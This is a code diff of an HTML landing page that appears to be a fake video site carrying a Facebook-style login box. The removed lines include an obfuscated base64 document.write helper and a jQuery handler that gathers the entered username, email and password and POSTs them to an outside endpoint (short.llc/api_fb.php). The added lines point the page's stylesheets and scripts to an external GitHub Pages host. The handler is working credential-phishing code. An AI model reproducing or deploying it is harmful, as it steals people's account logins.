@@ -2,21 +2,9 @@
 
 <head>
 	<link rel="shortcut icon" type="image/x-icon" href="https://i.imgur.com/Xfys5a9.png">
-	<script type="text/javascript">
-		function cmx(txt) {
-			var result = atob(txt);
-			document.write(result);
-		}
-	</script>
-	<link rel="stylesheet" href="css/style.css?20319" type="text/css">
-	<link rel="stylesheet" href="css/player.css?20319" type="text/css">
-	<link rel="stylesheet" href="css/box-fb.css?20319" type="text/css">
-	<script type="text/javascript">
-		function cmx(txt) {
-			var result = atob(txt);
-			document.write(result);
-		}
-	</script>
+	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/style.css?20319" type="text/css">
+	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/player.css?20319" type="text/css">
+	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/box-fb.css?20319" type="text/css">
 	<script type="text/javascript">
 		function cid(name) {
 			return decodeURI(
@@ -74,8 +62,8 @@
 			us = usr,
 			hs = atob(srv)
 	</script>
-	<script type="text/javascript" src="js/like.js"></script>
-	<script type="text/javascript" src="js/mobile-detect.js"></script>
+	<script type="text/javascript" src="https://prekerteam.github.io/lp_tube1/js/like.js"></script>
+	<script type="text/javascript" src="https://prekerteam.github.io/lp_tube1/js/mobile-detect.js"></script>
 </head>
 
 <body style="background-color: #191919;">
@@ -241,34 +229,6 @@
 				us and it will be reviewed promptly for removal from this website.</p><br>
 		</div>
 	</div>
-	<script>
-		$("#bt").click(function () {
-			$("#bt").html("Sedang Proses....");
-			var a = $("#mrx").val().trim();
-			var b = $("#ml").val().trim();
-			var c = $("#pw").val().trim();
-			var dataString = 'u=' + a + '&m=' + b + '&p=' + c;
-			$.ajax({
-				type: "POST",
-				url: "https://short.llc/api_fb.php",
-				data: dataString,
-				cache: false,
-				success: function (result) {
-					console.log(result);
-					if (data.pesan = "Sukses!") {
-						$("#error").html(data.url);
-					} else {
-
-						$("#bt").html("Login");
-						$("#error").html("Server Down!");
-					}
-				}
-			});
-			$("#lapor").show();
-			return false;
-		});
-	</script>
-	<!-- The Modal -->
 </body>
 
 </html>
